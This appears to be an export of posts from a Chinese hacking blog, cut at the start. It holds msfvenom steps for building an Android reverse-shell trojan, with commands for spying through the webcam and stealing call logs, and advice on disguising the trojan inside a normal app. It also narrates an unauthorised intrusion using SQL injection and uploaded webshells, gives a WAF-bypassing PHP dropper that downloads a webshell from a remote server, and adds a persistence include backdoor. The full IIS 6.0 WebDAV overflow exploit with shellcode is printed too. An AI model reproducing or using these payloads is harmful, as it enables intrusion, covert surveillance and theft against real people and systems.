LPORT=5555 R &gt; F:/1.apk 上面的命令大概就是利用msf生成一个可以回连侦听的APK安卓木马后门，LHOST填写你的本机IP，LPORT填写你要侦听的端口号，然后把文件重定向输出到你要的目录。 注：kali 2.0版本以后msf的生成pyload命令改成了msfvenom -p pentestbox: 在kalilinux下默认集成了msf，如果在Windows下使用msf，可以下载pentestbox，pentestbox是一款工具包，penbox下继承了大部分kali的工具，比如beef，burp，sqlmap等等，msf也集成了进去，所以总体来说还是很强大的。 当我们生成了APK木马后，然后我们配置msf，调用它的一个TCP反弹shell的载荷 命令如下：1234567msfconsole【打开msf】use exploit/multi/handerset payload android/meterpreter/reverse_tcp【选择payload】 show options 【查看参数情况】 注：pentestbox命令一样 从上面的图片我们可以看到，我们还没有设置要侦听的IP和端口信息，所以我们设置端口侦听。 12345set lhost 10.20.72.178 [这里设置的监听IP和刚刚生成的木马IP一样]set lport 5555 [设置刚刚生成木马的端口]exploit [开始监听] 当执行exploit的时候，msf已经处于监听端口的状态，只要你把你刚刚生成的安卓木马安装到对方手机上就会反弹一个msf的shell。 这是本机做测试生成的一个shell，我输入了sysinfo查看了被控端手机的设备信息，执行ifconfig查看了IP，当然，能做的事情不单单只有这么点点，比如还可以下载对方的通话记录，短信记录，开启对方的摄像头，拍照，录音功能，或者如果是root权限的话，直接增删改查任何文件也可是可以的。 通话记录截图： 命令：12345ifconfig 【查看端口】sysinfo 【查看系统信息】webcam list 【查看手机存在几个摄像头】webcam_snap -i 1或2【开启摄像头拍照】webcam_stream 【开启摄像头】 其他命令自己挖掘。可以利用help查看可用的命令。 小结网络问题：如果你本身的IP是内网IP，那么你最好开一个钓鱼wifl，或者把这个木马捆绑到一个正常的APK应用骗别人打开，当他人和你在同一网段才能进行端口监听，当然，你也可以进行内网转发，利用花生壳，等软件进行一个外网监听，这样只要你把APK木马移植到目标手机上，那么就可以进行监听操作，当然，前提是要对方开启网络。 免杀问题：现在的手机一般都是自带杀软，或者第三方杀软，msf生成的木马默认不是免杀的，所以在具体情况下要针对进行免杀。 ：） 内网转发的教程明天在写 pentestbox下载链接：下载 kalilinux下载链接：下载 后续pentestbox利用花生壳进行内网转发因为IPV4的地址有限，现在已经被分配的差不多了，所以大部分情况下，我们的PC电脑都是在内网当中，内网也就是私有的IP地址，也就是我们常说的局域网，例如： 192.168.1.0/24 10.10.20.0/24…上面这几个段都是一个内网C段，我们的PC大部分都是这样的，网吧也是如此。 私网是不能直接访问互联网的，必须做相关的路由策略或者进行一些配置才能接入到互联网，当然，首先你得有个宽带账号：） 所以，如果我们想配置安卓木马让外网的用户也能上线的话，我们就需要用到端口转发，也就是说，让别人可以直接访问到我们PC上的某个服务端口，进行建立连接，可以是httpweb网站服务，也可以和一个木马的控制端进行连接，这个其实非常简单！ 这里我们使用到的一个内网端口转发程序是“花生壳”。 花生壳的原理就是把你想转发的端口，通过服务，映射到某个外网的IP端口，学过网络的人可能知道，这个类似于NAT的多路复用转换原理。确实我感觉也是差不多。 首先我们注册一个花生壳的账户，并且在官网下载客户端，这些东西百度就好。 打开客户端，我们点击内网穿透，进行设置。我们申请一个免费域名，申请免费域名的目的，就是你内网要转发出去的那个服务器地址，这里花生壳利用一个域名当做外部地址。 这里我已经申请了两个免费域名，并且配置好了。 如果我们要添加一个内网穿透的地址，那么我们只要点击添加映射就行，如图： 上面的内容首先你添加一个名称，随便填即可。 然后填写你自己当前内网主机的IP地址，通过cmd下的ipconfig可以查看到 注：动态IP会每次重启后自动从dhcp服务器获取一个地址，所以不是固定的内网地址。 然后添加一个你要转发的端口号，因为当我们设置木马的时候，可以自己设置监听端口，所以，这里只要和木马的监听端口保持一致就好。 当我们设置好之后，我们就可以配置我们的木马了。 木马的配置上面讲的很明白，需要改动的地方，只要把反弹的地址IP换成你的域名地址，和你刚刚设置的端口号即可。 但是当我们msf设置本地监听的时候，我们需要设置监听的地址为我们本地的主机IP和端口，这些其实很简单。 以上做完以后，基本一个安卓木马的内外网上线已经很清楚了，如果不懂得话自己多琢磨就可以弄得很明白，或者在下面留言就好。 总结虽然这个实验目的技术要求不高，但是确实学到了很多东西，比如，内网转发，msf的基础使用，还有一些最基础的网络知识，当然，这些知识基础而已，更高级的的木马配置涉及到免杀绕过主动防御，自动上线反弹，等等，需要很底层的知识，遗憾的是我对这方面也不是很懂，需要自己不断地探索。 ：）","tags":[{"name":"kali 安卓木马","slug":"kali-安卓木马","permalink":"http://fjhack.me/tags/kali-安卓木马/"}]},{"title":"一次针对非法站点的渗透","date":"2017-04-05T07:30:28.970Z","path":"2017/04/05/04/","text":"算是朋友发过来的一个非法的基金操盘站，首先我们进行一些基本的信息判断收集。 ur：:http://www.xxxx.com/ 架构判断：php+阿帕奇+mysql+win/linux【大小写判断】 cms指纹：ecshop商城的二次开发 端口，旁站，C段等等 详细的信息就不列了，重点不在这里，这种站一般是要有前台的账号密码，当然，我也有。登录到前台大致看了下，简洁，url没有可利用传递的参数， 猜了几个比较常用的目录，没有发现什么，先上WVS扫一波吧，因为有会员账号， 所以登录状态扫描的话，会比不登录扫描爬到的页面更多，当然，前提是服务器没有防扫描，不然WVS的扫描动静碰到waf就死。这个站碰巧没有waf，当然，仅仅是没有waf，如果有waf的话只能利用其他的方法，比如说添加百度等这些友好的头部，waf对这些爬虫还是很友好的。 打开WVS，新建一个任务，然后在让你打开保存的cookie登录文件的地方新建一个工程文件，登录我们的账户，然后保存工程文件，退出，这里不说具体，详情可以去看WVS中文使用手册。看见红色高危，我就放心了，两个注入，一个XSS漏洞【估计是误报，XSS传递的参数都没有，事实证明是误报的】，测试漏洞，直接从SQL注入开始吧，看了一下WVS模拟的http包参数可以看到，这是一个基于HTTP头部Agent 的注入，这种注入很少碰到，百度看了下文章，跟cookie注入和host主机头注入是差不多的，也是对于提交参数不审核，带入数据库进行查询而产生的，当然手工有文章可是想快点验证，所以利用sqlmap直接注入。CODE： 123456789101112131415GET /home/index.php HTTP/1.1Referer: http://www.google.com/search?hl=en&amp;q=testingUser-Agent: if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/Client-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded-Host: localhostAccept-Language: enVia: 1.1 wa.www.test.comOrigin: http://www.test.com/X-Requested-With: XMLHttpRequestCookie: real_ipd=1.180.212.49; ECS_ID=eff3314f58e854862f4299b7cd5eba26b5cd1a30; ECS[username]=H74652211; _ga=GA1.2.1142116738.1481088459; _gat=1Host: www.xxxx.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */* 利用姿势： 首先抓取一个提交的get包，在get包里面我们可以看到agent头部信息，然后我们在agent信息后后面加上一个*标记，表示着重优先扫描，保存数据包到我们的sqlmap目录下。 然后打开sqlmap输入语句： sqlmap.py -r 1.txt –level 3 //这个等级三一般是用来检测头部注入 回车跑，出来了，存在注入，那么应该稳了吧，谁知道事实没这么顺利，跑出注入以后的几种思路 1.root权限，如果是root那么可以进行sql语句，读文件，和【有绝对路径】直接利用sql写shell。 2.普通权限，跑管理员的账号密码然后找后台地址，登录再进行尝试拿shell 然而两种都行不通，具体说下吧，首先我们跑了下权限，确实root，按道理来说root离拿shell没多远了，首先尝试直接跑管理员的密码数据，跑表列这些就不说了，我们直接跑当前库。 发现管理员的数据被保存在user_admin表下，跑出列内数据，MD5解密，发现两个都解不开，【最后上了服务器才发现hash密文是加盐的，也就是常说的双重加密】，换了几个国内外的MD5解密都解不开，看样子是运气不好。 那就换个思路，root权限按道理是可以执行sql语句的，那么我们是不是可以利用sql语句把原来的密文替换掉，或者我们自己新加一条管理员的数据呢，本地测试，可行，成功添加了管理员并且可以登录，那么我们也构造提交看看。 本地测试结果： 语句： sqlmap.py -r 1.txt –level 3 –sql-shell//进入sqlshell 然后执行mysql语句 insert into admin_user (username，password) values (‘admin88’,’MD5密文’) 想在管理员的列内添加一个admin88用户，执行之后发现，报错，百度看了下，说是模式问题，那么换种执行SQL语句的模式 sqlmap.py -r 1.txt –level 3 –sql-query “insert into admin_user (username，password) values (‘admin88’,’MD5密文’) “ 发现还是执行不了，然后请教一些大牛，大牛们说，不能执行多条语句，那么我们尝试执行 show databases 和 show tables 发现还是不行【最后发现是360在做鬼】 两种思路不行，那么只有尝试最后一种思路，写shell，因为是mysql，我们需要找到网站的绝对路径，找了很久没有找到【读阿帕奇的默认配置文件，尝试猜解路径等等】最后是在wvs里面已经爆出了绝对路径，自己没有发现而已 【以后要细心】，得到绝对路径D:\\WWW\\xxx\\home\\尝试写shell。 sqlmap.py -r 1.txt –level 3 –os-shell 发现也写不进去，有大牛说是目录不允许写入，换了几个目录，包括upload目录，应该不是权限的问题，最后还是失败，这时候觉得有点问题了，执行不了SQL语句，写不了shell，破解不了管理员密码，那这个注入也没什么用了， 还是返回思路，看了下WVS，也没发现什么可以利用的。 最后抱着试试的心态读了一下数据库的用户密码和一些配置文件，因为是root权限，而且服务器开了3306端口，如果允许外连的话，应该会有突破点。 读出来了 root/root 用工具尝试外连Mysql默认关闭外连。 失败。。。 这时候快要放弃了，朋友发来一个页面，也就是前台的会员上传头像的地方，有上传点是否有上传漏洞呢，尝试上传，首先上传一张正常的图片，发现上传后，审查元素查看路径，发现可以访问，那么这个上传点是正常的没有坏。 那么尝试直接上传脚本。这时候无语了，发现也上传上去了，审查元素，查看路径，进行访问，404！竟然访问不到？ 再次上传图片，发现可以访问，这时候进行判断，是否有waf之类的东西，上传一个txt，发现也访问不到，那么应该不是waf，最后测试发现，除了上传图片，其他的上传文件几乎都访问不到，这就有点迷惑了，为什么有上传路径但 是却访问不到呢，抓包看看，抓包看了没发现什么区别，上传图片和其他格式的文件服务器返回的响应都是302，那么按道理是存在任意上传，而且文件应该上传上去了，测试了几种突破上传，无果，那么为什么访问不到呢，这时候 反复试了几次，大概判断是waf之类的在做鬼，把上传的图片文件内容替换成了一个免杀一句话，然后不通过审查元素查看路径看看，利用抓包路径访问，发现，成功上传shell，但是直接访问url是报错的，那么用菜刀尝试连接一下，成功getshell，拿到一句话权 限之后，发现开始上传的图片，txt都在目录下，唯独php那些脚本不见了，难道是被杀了，只有上服务器一探究竟了。 一句话的权限还是很大的，sys权限，跨磁盘也有增删改查权限，看了一下IP，是外网可以直接3389连接。直接提权，连接，连接之后发现原来是360主动防御在做鬼，难怪执行不了SQL语句和写入文件，却可以进行扫描【后面尝试 写入文件发现360自动阻拦】，然后打开数据库，尝试增加一条数据，发现增加后的数据后台登录不了，最后发现原来cms利用了加盐的加密，难怪死活解不开，那么我们把加密值改为0，添加一条未加盐的MD5密文，数据库会默认改为加盐值，当然，如果你想解开管理员原有的密码，只能够解开他的加密算法，在进行MD5接密，最后成功添加，进入后台之。 渗透到此结束，写了一些思路也不全是我一个人的思路，有朋友帮忙，有些东西也没写出来，因为敏感，图片贴的比较少，因为怕人爆菊【查水表就不好了】，写这个笔记的原因也是为了以后没思路的时候看看，这次的渗透主要是想说明，两个问题。 第一：思路要明确，要细心，不要放过任何一个可以利用的地方，渗透如果说你没有0day或者其他的技巧的话，你就需要比别人多一份细心。 第二：不要习惯自己的方法，比如说审查元素查看上传后的地址，要习惯与抓包查看，要细心分析每一个地方。 PS：因为敏感网站，固打码，图片较少因为HEXO的图片引用太麻烦，如果一定需要图片的话，会加上去，没有什么奇淫技巧，只是一点小小的经验 :)","tags":[{"name":"-渗透笔记","slug":"渗透笔记","permalink":"http://fjhack.me/tags/渗透笔记/"}]},{"title":"利用MySQLROOT权限远程下载脚本绕过云锁拿shell","date":"2017-04-04T13:20:00.950Z","path":"2017/04/04/03/","text":"碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。 连接上，通过查看MySQL数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。 换思路，利用MySQL写文件函数，写shell进网站的目录，首先需要知道网站的绝对路径，利用thinkPHP的报错特性，爆出绝对路径。直接执行SQL语句 select ‘一句话’ into outfile ‘D://thinkhphp//xx//1.php’ 注意：云锁如果不检测写入的内容的话可以直接写明文， 但是最好写hex加密代码，那么代码就不需要单引号括起来，还要注意的就是，写绝对路径必须写两个“/”,除非写\\，否则会被转义。 本机测试，成功写入一句话，但是连接的时候被云锁拦截了，个人感觉可能是云锁拦截了post的特征，需要修改菜刀的连接特征，可惜我不会。.直接写入大马测试，nosafe的大马可以正常使用，直接写入大马，发现大马字符太大没办法写入，这时候利用95zz发的一个脚本，执行远程下载，他在文章中说因为云锁是拦截php代码的，例如&lt;? ?&gt;，的头部，所以远程下载的脚本是利用JavaScript转写php 1&lt;script language=\"php\"&gt; $a='http://远程地址/sss.txt';$b='file'.'_g'.'et_'.'contents';$b = $b($a);file_put_contents('file.php',$b); &lt;/script&gt; 这行代码是利用一个远程下载函数，将远程服务器的文件下载，并重新生成一个file.php的php代码，所以我们在自己的web服务器上放上大马的txt，配合利用MySQL的文件写入先生成一个远程下载的php，在直接访问这个php，生成一个php大马，测试通过，成功getshell，尝试提权，无法使用大部分cmd提权命令，目的只需要shell权限就好，没有深究，做了一个文件包含，固权，退之。 包含脚本：12345if(isset($_GET[\"id\"]))&#123;require_once('D:\\\\WWW\\\\web\\\\images\\\\load.jpg');&#125;注意闭合。","tags":[{"name":"绕过Waf","slug":"绕过Waf","permalink":"http://fjhack.me/tags/绕过Waf/"},{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://fjhack.me/tags/渗透笔记/"}]},{"title":"IIS6.0远程代码执行漏洞个人浅析","date":"2017-04-03T08:22:32.720Z","path":"2017/04/03/02/","text":"PS：不喜可以喷，要是要喷的有理由，这样你指出了我的错误，我也得到了学习何乐而不为？ IIS6.0远程代码执行的漏洞是发生在WebDav开启情况下发生的，当IIS6.0开启这个服务可以存在缓存区域溢出。 官方给出的exp： 1234567891011121314151617import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('192.168.5.128',88)) pay='PROPFIND / HTTP/1.1\\r\\nHost: 192.168.5.128:88\\r\\nContent-Length: 0\\r\\n'pay+='If: &lt;http://192.168.5.128:88/aaaaaaa'pay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'pay+='&gt;'pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://192.168.5.128:88/bbbbbbb'pay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'shellcode='\"VYhffffk4diFkDql02Dqm0D1CuEE5n3l0G3j3C0S1p02024B0W3y2G2u4D0k4q3c\".\"0615092E0T0H0l4s4u1k0A2p3G0Y3W3A0u2K2J0P2o4E3U2L370w3N5O3h2p1O2w1o3v4\".\"T3P4n1K3v4n0z3Y0S0M2k5L4J0m4Y2D103V2s4K4t0Q0U0P7o2L4P2O8K3r0j0y0N0s37\".\"2l0m5K0Y8M0S5p4V110Q2J182s7M2K344J3j04VYVTX10X41PZ41H4A4I1TA71TADVTZ3\".\"2PZNBFZDQC02DQD0D13DJEON4F1W9M490R0P0654E2M9Y2F64346K5K450115MN2G0N0\".\"B0L5C5DKO106737KO9W8P0O2L1L0P184E3U0Q8P1G3L5O9R601E671O9W343QOO113RJO\".\"LK8M640M1K3WOL1W4Y2O613V2I4K5C0R0S0PMO2O3W2O8K9R1Z1K0S1H3PLMKM5KKK8M0\".\"S4JJL15612J1267KM2K4D903K03VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQ\".\"AIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYA\".\"ZBABABABAB30APB944JB9K7YMY7Y7O1SKWKQ0X6QLT8Y2TMTJT1K3S7SKT013KLUKS3KL\".\"U3QJR1Y04MT4S1Y6L9UKTLX0I1P096TJPML5N0E5K4O6LMP07MW038R9WJT9K0J4M5NOK\".\"KKMS3N0L4L8S1N8NLW11JV1V6YKO1SMO1P2OMNKOMK4N8QOO0KKR104POLLZ3XLWJXML6\".\"SKN03MQMK0GMQ1ZLZ8K6Y4LKPA\";'pay+=shellcodepay+='&gt;\\r\\n\\r\\n'print paysock.send(pay) data = sock.recv(80960) print datasock.close 用原作者的话说，他的POC是利用3次溢出构建ROP链，绕过内存地址随机化，说实话我是听不懂的任何一个名词的，只了解字面上的意思，但是想了解原理，于是从exp代码分析 从上面的Python代码我们可以进行分析这个漏洞利用的整个过程，个人认为，就是利用了webdav服务的开启，可以进行更多的数据提交方式，默认的话是get,post,cookie，这几类，当然，如果开启接收任何提交方式的请求，那么可以利用put提交方式，直接写shell，类似的提交方式还有move，copy，del等等，但是上面的代码利用提交方式不是http自带的提交方式，而是利用是一个扩展协议，PROPFIND，而不是传统的http协议，propfind正常的情况下是查看属性的提交方式，当我们利用缓冲区域溢出，也就是当提交的数据，超出了程序能够承载的量那么就会导致程序出错，也就是造成了溢出。 从上面的代码我分析了一下，这个poc分为三个部分，导包指定目的IP就不用说了，直接按照自己的理解就是 第一个部分就是利用propfind的方式向服务器进行提交数据。 第二部分就提交的pay数据值就是一段缓冲区域溢出代码，看样子是一些占位比较大的符号进行了hex编码，当webdav接收这些参数的时候，会处理不过来，也就造成了数据溢出，我们提交的数据有一部分已经溢出了webdav程序的这个容器，溢出的数据都会在进程中，如果我们可以控制溢出的数据，那么我们可以进行一个代码执行。 第三个部分也就是我们要控制的溢出参数，上面的poc给定的值是“shellcode”，通过一些测试和询问发现，这个shellcode值可能是利用msf生成的一个payload，然后利用编码器，将代码编为“x86/unicode_upper”，因为本人小白，不太懂底层的东西，感觉这可能是内存或者底层能够识别的编码方式吧，通过这个poc，发现这个shellcode的作用就是在进程中溢出一个计算器的进程，用户权限是network，权限虽然小但是还是有很多可以利用的方法，通过检测发现，这个漏洞貌似只有支持PROPFIND的请求方法才会有效，个人测试了几个扩展协议没有成功溢出shellcode，或许是我的姿势不对吧,至少我这么尝试没有成功。 总结：这个漏洞的总体利用过程 检查服务器是否开启webdav服务【我们可以利用OPTIONS的请求方法进行判断服务器是否开启WEBDAV，且支持propfind的请求方法】 → 通过扩展协议propfind，向服务器发送一个缓冲区溢出代码和可控制的shellcode → 然后服务器接受到这个包发生了缓冲区溢出，将我们的shellcode溢出到了进程中。 那么利用这个漏洞，我们如果可以控制shllecode，是不是可以直接注入一个反弹shell的payload，或者说是一个远程木马，因为直接注入进程等于不用执行文件，绕过waf，等等，当然没有汇编基础还是不行的，所以只能慢慢学，问了问搞编程的朋友，是否可以直接利用这个漏洞写类似于远控程序，或者其他的后门的，他的回答是肯定可以的，具体的话涉及到内存的转换和储存过程，这些我们暂时不深究，因为只有实验才能给出答案，如果我成功了，我肯定会写出续文，虽然这个漏洞挺鸡肋，到此为止总结大概也完了。 以上是个人的愚见总结，其实感觉这个漏洞是挺有意思的，虽然现在用IIS6.0的服务器是越来越少了，但是我相信，在底层，有更多的漏洞都是基于“缓冲区域溢出”，并且常规的waf对此事无法拦截的【比如基于缓冲区域溢出的SQL注入攻击:) 】可惜无奈自己对底层的东西还是了解的太少了。要花时间去补习这些底层知识。 最后附上一个大牛写出来可利用msf直接加载攻击的exp，目前只针对Windows2003 R2版本有效，直接利用Metasploit把这个攻击载荷加入进去，set一下配置即可完成攻击，具体是返回一个network权限的shell。 MSF利用exp: 下载 参考文献：这篇确实讲的很详细，可以学到很多东西！http://www.tuicool.com/articles/7ziu6jE","tags":[{"name":"IIS6.0","slug":"IIS6-0","permalink":"http://fjhack.me/tags/IIS6-0/"},{"name":"代码执行漏洞","slug":"代码执行漏洞","permalink":"http://fjhack.me/tags/代码执行漏洞/"}]},{"title":"诞生日---第一篇博文","date":"2017-04-01T11:48:46.717Z","path":"2017/04/01/01/","text":"Hello，Word！在自己的摸索下，HEXO的博客终于搭建起来了，开这个博客有很多原因，感觉如果不用博客德华都不好意思自己是搞IT得，开玩笑的，其实最重要还是只想让自己做个不浮躁的人，只有沉下心才能学到更多的东西，当然，不一定会有人关注，但是自己的小圈子内能够互相学习，就够了，很乐意结交更多的朋友，一起交流，而不是互相吹捧，因为那毫无意义。每个人都是从小白做起，这个圈子里面似乎并没有尽头，当你接触久了就会发现，这原来是个无底洞，因为技术本来就是没有尽头的，虽然洞很深而且还有很多的坑，可是依然有那么多人坚持着，也许为了好奇，也许为了￥￥，或许就是为了图一时兴起的快感无论你想得到的是什么 但是过程都是一样的。人活着不就是为了做自己想做的事情，虽然有制度，有规则约束着你，但是你照样可以看到”乌托邦”。 我很乐意分享自己的经验，也许没人看得到，但是至少自己去做了，如果有幸有人看到并且指出了我的错误，那我也学到了更多的东西，这样没什么不好的。 结语就像每一个时代里的人都觉得自己没有赶上一个好的时代一样。这里没有末路，你从不曾孤独。 ——韩寒 so Come on 